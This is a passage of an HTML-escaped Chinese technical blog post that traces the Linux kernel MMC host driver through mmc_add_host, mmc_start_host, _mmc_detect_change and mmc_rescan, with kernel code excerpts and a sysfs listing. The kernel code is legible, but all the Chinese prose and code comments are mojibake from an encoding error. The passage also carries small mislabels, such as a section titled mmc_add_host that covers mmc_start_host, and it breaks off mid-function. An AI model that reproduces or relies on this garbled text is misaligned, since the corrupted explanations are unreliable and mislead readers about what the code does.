&lt;ul&gt;&lt;li&gt;åŠ¨æ€åˆ†é…å†…å­˜ç»™Â &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt;Â ç»“æ„ä½“ï¼Œå¹¶å¯¹ç»“æ„ä½“æˆå‘˜åˆå§‹åŒ–ã€‚&lt;/li&gt;
&lt;li&gt;è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;device_initialize()&lt;/span&gt;Â å¯¹Â &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;class_dev&lt;/span&gt;Â è¿›è¡Œåˆå§‹åŒ–ï¼ŒåŒ…æ‹¬Â &lt;span class=&quot;cnblogs_code&quot;&gt;kobject&lt;/span&gt;Â ã€Â &lt;span class=&quot;cnblogs_code&quot;&gt;mutex&lt;/span&gt;Â ç­‰ã€‚&lt;/li&gt;
&lt;li&gt;åˆå§‹åŒ–è‡ªæ—‹é”ã€ç­‰å¾…é˜Ÿåˆ— (&lt;span&gt;waitqueue&lt;/span&gt;)å’Œå»¶è¿Ÿçš„å·¥ä½œé˜Ÿåˆ— (&lt;span&gt;Delayed Work&lt;/span&gt;)ï¼Œå…¶ä¸­ï¼Œç”¨å¤„ç†å‡½æ•°Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan()&lt;/span&gt;Â æ¥åˆå§‹åŒ–å»¶è¿Ÿçš„å·¥ä½œé˜Ÿåˆ—Â &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;detect&lt;/span&gt;Â ï¼Œåæ–‡ä¼šå†æ¬¡æåˆ°ã€‚&lt;/li&gt;
&lt;li&gt;åˆå§‹åŒ–å®šæ—¶å™¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;retune_timer&lt;/span&gt;Â ï¼Œå¤„ç†å‡½æ•°ä¸ºÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_retune_timer()&lt;/span&gt;Â ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;43-mmc_add_hostmmc&quot;&gt;&lt;span&gt;4.3 mmc_add_host(mmc)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;åœ¨ä¸Šè¿°å¯¹hostè¿›è¡Œåˆå§‹åŒ–åï¼Œè°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_host()&lt;/span&gt;Â å°†hostæ³¨å†Œåˆ°é©±åŠ¨æ¨¡å‹ä¸­ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/host.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  mmc_add_host - initialise host hardware  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; mmc_add_host(&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;

    WARN_ON((host&lt;/span&gt;-&amp;gt;caps &amp;amp; MMC_CAP_SDIO_IRQ) &amp;amp;&amp;amp;
            !host-&amp;gt;ops-&amp;gt;&lt;span&gt;enable_sdio_irq);

    err &lt;/span&gt;= device_add(&amp;amp;host-&amp;gt;&lt;span&gt;class_dev);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (err)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; err;

    led_trigger_register_simple(dev_name(&lt;/span&gt;&amp;amp;host-&amp;gt;class_dev), &amp;amp;host-&amp;gt;&lt;span&gt;led);

#ifdef CONFIG_DEBUG_FS
    mmc_add_host_debugfs(host);
&lt;/span&gt;&lt;span&gt;#endif&lt;/span&gt;&lt;span&gt;

    mmc_start_host(host);
    mmc_register_pm_notifier(host);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;ä¸»è¦çš„å·¥ä½œåŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼š&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;device_add()&lt;/span&gt;Â å°†Â &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;class_dev&lt;/span&gt;Â åŠ å…¥åˆ°sysfsä¸­deviceå±‚æ¬¡ç»“æ„ä¸­ã€‚&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_start_host()&lt;/span&gt;Â å¯åŠ¨ä¸»è®¾å¤‡ï¼Œä¹Ÿå³MMCè®¾å¤‡å¼€å§‹æ­£å¸¸å·¥ä½œã€‚&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;åœ¨ä»‹ç»Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_start_host()&lt;/span&gt;Â ä¹‹å‰ï¼Œå…ˆç®€å•ä»‹ç»ä¸‹æ­¤å¤„å°†Â &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;class_dev&lt;/span&gt;Â åŠ å…¥åˆ°é©±åŠ¨æ¨¡å‹åsysfsä¸­è¡¨ç°å‡ºæ¥çš„å±‚æ¬¡ç»“æ„ã€‚ 4.2ä¸€èŠ‚ä¸­ä»‹ç»Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_alloc_host()&lt;/span&gt;Â æ—¶æ³¨æ„åˆ°Â &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;class_dev&lt;/span&gt;Â çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;class&lt;/span&gt;&lt;/span&gt;Â è¢«è®¾ç½®ä¸ºÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_class&lt;/span&gt;Â ï¼ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;parent&lt;/span&gt;Â æŒ‡å‘Â &lt;span class=&quot;cnblogs_code&quot;&gt;pdev-&amp;gt;dev&lt;/span&gt;Â ã€‚Â &lt;span class=&quot;cnblogs_code&quot;&gt;device_add()--&amp;gt;get_device_parent()/device_add_class_symlinks()&lt;/span&gt;Â è°ƒç”¨è¿‡ç¨‹ä¸­å°†åœ¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt;Â çš„ç›®å½•ä¸‹å¤šå»ºç«‹ä¸€ä¸ªåç§°å’ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;class&lt;/span&gt; name&lt;/span&gt;Â ç›¸åŒçš„å­æ–‡ä»¶å¤¹ï¼ŒåŒæ—¶åœ¨classç±»ç›®å½•ä¸‹ä¹Ÿä¼šæœ‰æŒ‡å‘å®é™…è®¾å¤‡çš„ç›®å½•é¡¹ã€‚sysfsæ­¤æ—¶çš„ç»“æ„å¦‚ä¸‹ï¼š&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
/sys/devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/&lt;span&gt;mmc0$ ll
total &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;21&lt;/span&gt; ./&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;21&lt;/span&gt; ../&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;23&lt;/span&gt; device -&amp;gt; ../../../xxx_mmc.&lt;span&gt;0&lt;/span&gt;/&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;23&lt;/span&gt; power/&lt;span&gt;
... ...  root root    &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;23&lt;/span&gt; subsystem -&amp;gt; ../../../../../&lt;span&gt;class&lt;/span&gt;/mmc_host/&lt;span&gt;
... ...  root root &lt;/span&gt;&lt;span&gt;4096&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;23&lt;/span&gt;&lt;span&gt; uevent

&lt;/span&gt;/sys/&lt;span&gt;class&lt;/span&gt;/mmc_host$ ll        /sys/&lt;span&gt;class&lt;/span&gt;/&lt;span&gt;mmc_host
total &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
... ...  root root &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;21&lt;/span&gt; ./&lt;span&gt;
... ...  root root &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;09&lt;/span&gt; ../&lt;span&gt;
... ...  root root &lt;/span&gt;&lt;span&gt;0&lt;/span&gt; Sep &lt;span&gt;17&lt;/span&gt; &lt;span&gt;11&lt;/span&gt;:&lt;span&gt;26&lt;/span&gt; mmc0 -&amp;gt; ../../devices/platform/xxx_mmc.&lt;span&gt;0&lt;/span&gt;/mmc_host/mmc0/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;æ­¤æ—¶Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host&lt;/span&gt;Â ç»“æ„ä½“æˆå‘˜åˆå§‹åŒ–çŠ¶æ€ç®€è¦åˆ—ä¸¾å¦‚ä¸‹ï¼ˆè¯¦ç»†å¯ä»¥æŒ‰ç…§é©±åŠ¨æ¨¡å‹ä¸­&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;device&lt;/code&gt;æ³¨å†Œæ­¥éª¤æ¨å¯¼ï¼‰ï¼š&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37.5&quot;&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; id=&quot;code_img_closed_a0b40ea9-8a81-4094-b788-dfe5023babc4&quot; class=&quot;code_img_closed&quot;/&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; id=&quot;code_img_opened_a0b40ea9-8a81-4094-b788-dfe5023babc4&quot; class=&quot;code_img_opened&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_a0b40ea9-8a81-4094-b788-dfe5023babc4&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;70&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_host mmc {
    .rescan_disable    &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; set to 0 in mmc_start_host()&lt;/span&gt;
&lt;span&gt;
    .index         &lt;/span&gt;=&lt;span&gt; id (allocated)
    .class_dev (&lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; dev)=&lt;span&gt; {
        .p &lt;/span&gt;=&lt;span&gt; {
            .device &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc.class_dev
                .klist_children &lt;/span&gt;=&lt;span&gt; 
                .deferred_probe &lt;/span&gt;=&lt;span&gt; 
        }
        . kobj &lt;/span&gt;=&lt;span&gt; {
            .name &lt;/span&gt;= (â€œmmc%dâ€, .index)       &lt;span&gt;//&lt;/span&gt;&lt;span&gt; name = â€œmmc0â€&lt;/span&gt;
            .kset =&lt;span&gt; devices_kset        
            .ktype &lt;/span&gt;= &amp;amp;&lt;span&gt;device_ktype
            INIT_LIST_HEAD(.dma_pools);
            mutex_init(.mutex);
            spin_lock_init(.devres_lock);
            INIT_LIST_HEAD(.devres_head);

            .parent &lt;/span&gt;= dir-&amp;gt;&lt;span&gt;kobject;  
                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  /sys/devices/platform/xxx_mmc.0/mmc_host/mmc0  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
                &lt;span&gt;//&lt;/span&gt;&lt;span&gt;struct class_dir dir = {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    .class = &amp;amp;mmc_host_class
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;        .kobj = {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;            .ktype = &amp;amp;class_dir_ktype
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;                .kset = &amp;amp; mmc_host_class-&amp;gt;p-&amp;gt;glue_dirs
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;                .parent = &amp;amp;pdev-&amp;gt;dev-&amp;gt;kobj      
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;                /*  /sys/devices/platform/xxx_mmc.0/   */

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;                .name = â€œmmc_hostâ€
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;        }
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;}&lt;/span&gt;
&lt;span&gt;
        }
        .parent &lt;/span&gt;= &amp;amp;pdev-&amp;gt;&lt;span&gt;dev
            .&lt;/span&gt;&lt;span&gt;class&lt;/span&gt; = &amp;amp;mmc_host_class =&lt;span&gt; {
                .name       &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc_host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                .dev_release    &lt;/span&gt;=&lt;span&gt; mmc_host_classdev_release,
                .dev_kobj &lt;/span&gt;=&lt;span&gt; sysfs_dev_char_kobj
                    .p (&lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; subsys_private) =&lt;span&gt; {
                        .&lt;/span&gt;&lt;span&gt;class&lt;/span&gt; = &amp;amp;&lt;span&gt;mmc_host_class
                            . glue_dirs (kset) &lt;/span&gt;=&lt;span&gt; {
                                .kobj &lt;/span&gt;=&lt;span&gt; 
                                    .list &lt;/span&gt;=&lt;span&gt; 
                                    .list_lock &lt;/span&gt;=&lt;span&gt; 
                            }
                        . subsys (&lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; kset) =&lt;span&gt; {
                            .kobj &lt;/span&gt;=&lt;span&gt; {
                                .name &lt;/span&gt;=&lt;span&gt; â€œmmc_hostâ€
                                    .parent &lt;/span&gt;= &amp;amp; class_kset-&amp;gt;&lt;span&gt;kobj
                                    .kset  &lt;/span&gt;=&lt;span&gt; class_kset;
                                .ktype &lt;/span&gt;= &amp;amp;&lt;span&gt;class_ktype;

                                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; create_dir(kobj)&lt;/span&gt;
&lt;span&gt;                            }
                        }
                    }
            };
    }
    .parent &lt;/span&gt;= &amp;amp;pdev-&amp;gt;&lt;span&gt;dev

    spin_lock_init(&lt;/span&gt;&amp;amp;.&lt;span&gt;lock&lt;/span&gt;&lt;span&gt;);
    init_waitqueue_head(&lt;/span&gt;&amp;amp;&lt;span&gt;.wq);
    INIT_DELAYED_WORK(&lt;/span&gt;&amp;amp;&lt;span&gt;.detect, mmc_rescan);
    INIT_DELAYED_WORK(&lt;/span&gt;&amp;amp;&lt;span&gt;.sdio_irq_work, sdio_irq_work);
    timer_setup(&lt;/span&gt;&amp;amp;.retune_timer, mmc_retune_timer, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    .max_segs         &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;
        .max_seg_size  &lt;/span&gt;= PAGE_SIZE     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;max segment size 8K&lt;/span&gt;
        .max_req_size  =&lt;span&gt; PAGE_SIZE
        .max_blk_size  &lt;/span&gt;= &lt;span&gt;512&lt;/span&gt;&lt;span&gt;
        .max_blk_count     &lt;/span&gt;= PAGE_SIZE / &lt;span&gt;512&lt;/span&gt;&lt;span&gt;
        .fixed_drv_type    &lt;/span&gt;= -&lt;span&gt;EINVAL
        .ios &lt;/span&gt;=&lt;span&gt; {
            .power_delay_ms &lt;/span&gt;= &lt;span&gt;10&lt;/span&gt;&lt;span&gt;
            .power_mode &lt;/span&gt;= MMC_POWER_UP      &lt;span&gt;//&lt;/span&gt;&lt;span&gt; mmc_start_host()&lt;/span&gt;
            .vdd = fls(ocr) â€“ &lt;span&gt;1&lt;/span&gt;             &lt;span&gt;//&lt;/span&gt;&lt;span&gt; mmc_power_up(host, host-&amp;gt;ocr_avail);&lt;/span&gt;
            .clock =&lt;span&gt; .f_init

        }
    . ops &lt;/span&gt;=&lt;span&gt; {
        .request    &lt;/span&gt;=&lt;span&gt; xxx_mmc_request,
        .set_ios    &lt;/span&gt;=&lt;span&gt; xxx_mmc_set_ios,
    }
    .f_min         &lt;/span&gt;= &lt;span&gt;400000&lt;/span&gt;&lt;span&gt;
    .f_max         &lt;/span&gt;= &lt;span&gt;52000000&lt;/span&gt;&lt;span&gt;
    .ocr_avail     &lt;/span&gt;= MMC_VDD_32_33 = &lt;span&gt;0x00100000&lt;/span&gt;&lt;span&gt;
    .caps  &lt;/span&gt;= MMC_CAP_8_BIT_DATA |  MMC_CAP_NONREMOVABLE |&lt;span&gt; MMC_CAP_MMC_HIGHSPEED;
    .caps2 &lt;/span&gt;= MMC_CAP2_BOOTPART_NOACC |&lt;span&gt; MMC_CAP_PANIC_WRITE;
    .pm_notify.notifier_call &lt;/span&gt;=&lt;span&gt; mmc_pm_notify
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;44-mmc_add_hostmmc&quot;&gt;&lt;span&gt;4.4 mmc_add_host(mmc)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/core.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

&lt;span&gt;void&lt;/span&gt; mmc_start_host(&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host)
{
    host&lt;/span&gt;-&amp;gt;f_init = max(freqs[&lt;span&gt;0&lt;/span&gt;], host-&amp;gt;&lt;span&gt;f_min);
    host&lt;/span&gt;-&amp;gt;rescan_disable = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    host&lt;/span&gt;-&amp;gt;ios.power_mode =&lt;span&gt; MMC_POWER_UNDEFINED;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!(host-&amp;gt;caps2 &amp;amp;&lt;span&gt; MMC_CAP2_NO_PRESCAN_POWERUP)) {
        mmc_claim_host(host);
        mmc_power_up(host, host&lt;/span&gt;-&amp;gt;&lt;span&gt;ocr_avail);
        mmc_release_host(host);
    }

    mmc_gpiod_request_cd_irq(host);
    _mmc_detect_change(host, &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;rescan_disable = &lt;span&gt;0&lt;/span&gt;&lt;/span&gt;Â ä½¿èƒ½ä¸»è®¾å¤‡çš„é‡æ–°æ£€æµ‹ã€‚&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;æœªä½¿èƒ½Â &lt;span class=&quot;cnblogs_code&quot;&gt;MMC_CAP2_NO_PRESCAN_POWERU&lt;/span&gt;Â &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;P&lt;/code&gt;æ—¶ï¼Œå°†å®ŒæˆÂ &lt;span class=&quot;cnblogs_code&quot;&gt;claim_host()&lt;/span&gt;Â ã€Â &lt;span class=&quot;cnblogs_code&quot;&gt;power_up()&lt;/span&gt;Â ã€Â &lt;span class=&quot;cnblogs_code&quot;&gt;release_host()&lt;/span&gt;Â ç­‰ä¸€ç³»åˆ—å·¥ä½œã€‚&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_gpiod_request_cd_irq()&lt;/span&gt;Â ç”¨äºä¸ºhostç”³è¯·ä¸­æ–­å·ï¼ˆå’ŒGPIOå£å¯¹åº”ï¼‰ï¼Œå¹¶ç»‘å®šä¸­æ–­æœåŠ¡å‡½æ•°ã€‚&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;_mmc_detect_change(host, &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;)&lt;/span&gt;Â ç”¨äºæ£€æµ‹MMCæ§½ä½ä¸Šçš„å˜åŠ¨ã€‚&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_claim_host(host)&lt;/span&gt;Â å‡½æ•°ç”¨äºç”³è¯·è·å¾—hostï¼ˆä¸»æ§åˆ¶å™¨ï¼‰çš„ä½¿ç”¨æƒï¼Œè¿›ç¨‹å°†è¿›å…¥ä¼‘çœ ç­‰å¾…çŠ¶æ€ï¼Œç›´è‡³å¯ä»¥è·å¾—ä¸»æ§åˆ¶å™¨çš„ä½¿ç”¨æƒã€‚è¯¥å‡½æ•°ç»“åˆÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_release_host(host)&lt;/span&gt;Â ï¼Œåˆ©ç”¨ç­‰å¾…é˜Ÿåˆ—å®ç°ï¼ŒåŸç†ç»†èŠ‚å¯ä»¥å‚è€ƒï¼š&lt;a href=&quot;https://www.cnblogs.com/hueyxu/p/13745029.html&quot;&gt;Linuxç­‰å¾…é˜Ÿåˆ—ï¼ˆWait Queueï¼‰&lt;/a&gt;ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;45-_mmc_detect_changehost-0-false&quot;&gt;&lt;span&gt;4.5 _mmc_detect_change(host, 0, false)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;15&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; _mmc_detect_change(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, unsigned &lt;span&gt;long&lt;/span&gt; delay, &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; cd_irq)
{
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (cd_irq &amp;amp;&amp;amp; !(host-&amp;gt;caps &amp;amp; MMC_CAP_NEEDS_POLL) &amp;amp;&amp;amp;&lt;span&gt;
            device_can_wakeup(mmc_dev(host)))
        pm_wakeup_event(mmc_dev(host), &lt;/span&gt;&lt;span&gt;5000&lt;/span&gt;&lt;span&gt;);

    host&lt;/span&gt;-&amp;gt;detect_change = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    mmc_schedule_delayed_work(&lt;/span&gt;&amp;amp;host-&amp;gt;&lt;span&gt;detect, delay);
}

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_schedule_delayed_work(&lt;span&gt;struct&lt;/span&gt; delayed_work *work, unsigned &lt;span&gt;long&lt;/span&gt;&lt;span&gt; delay)
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; queue_delayed_work(system_freezable_wq, work, delay);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;_mmc_detect_change()&lt;/span&gt;Â å‡½æ•°ç”¨æ¥æ£€æµ‹MMCçŠ¶æ€çš„æ”¹å˜ï¼Œå…·ä½“æ˜¯é€šè¿‡è°ƒåº¦å·¥ä½œé˜Ÿåˆ—å®ç°ï¼Œå¦‚4.2ä¸€èŠ‚ä»‹ç»ï¼ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan()&lt;/span&gt;Â ä½œä¸ºå¤„ç†å‡½æ•°è¢«ç»‘å®šåœ¨å»¶è¿Ÿå·¥ä½œé˜Ÿåˆ—Â &lt;span class=&quot;cnblogs_code&quot;&gt;host-&amp;gt;detect&lt;/span&gt;Â ä¸Šã€‚å› æ­¤ï¼Œæ­¤å¤„å®é™…ä¸Šæ˜¯å¯åŠ¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_rescan()&lt;/span&gt;Â çš„æ‰§è¡Œè¿‡ç¨‹ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;46-mmc_rescanhost-detect&quot;&gt;&lt;span&gt;4.6 mmc_rescan(&amp;amp;host-&amp;gt;detect)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;21&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;void&lt;/span&gt; mmc_rescan(&lt;span&gt;struct&lt;/span&gt; work_struct *&lt;span&gt;work)
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; é€šè¿‡host-&amp;gt;detectæŒ‡é’ˆå¾—åˆ°mmc_hostç»“æ„ä½“æŒ‡é’ˆ&lt;/span&gt;
    &lt;span&gt;struct&lt;/span&gt; mmc_host *host = container_of(work, &lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_host, detect.work);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å¦‚æœrescanè¢«ç¦æ­¢ï¼Œå‡½æ•°æå‰è¿”å›&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (host-&amp;gt;&lt;span&gt;rescan_disable)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å¯¹äºä¸å¯ç§»é™¤(non-removable)çš„hostï¼Œå¦‚æœå…¶æ­£åœ¨åšrescanå·¥ä½œæ—¶ï¼Œå‡½æ•°æå‰è¿”å›ï¼ˆscanåªåšä¸€æ¬¡ï¼‰&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!mmc_card_is_removable(host) &amp;amp;&amp;amp; host-&amp;gt;&lt;span&gt;rescan_entered)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åŸºæœ¬æ£€æŸ¥é€šè¿‡ï¼Œè¿›å…¥rescanæµç¨‹ï¼Œæ ‡è®°rescan_entered&lt;/span&gt;
    host-&amp;gt;rescan_entered = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    ... ...
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; æ£€æŸ¥å¯ç§»é™¤(removable) hostæ˜¯å¦è¿˜å­˜åœ¨&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (host-&amp;gt;bus_ops &amp;amp;&amp;amp; !host-&amp;gt;bus_dead &amp;amp;&amp;amp;&lt;span&gt; mmc_card_is_removable(host))
        host&lt;/span&gt;-&amp;gt;bus_ops-&amp;gt;&lt;span&gt;detect(host);

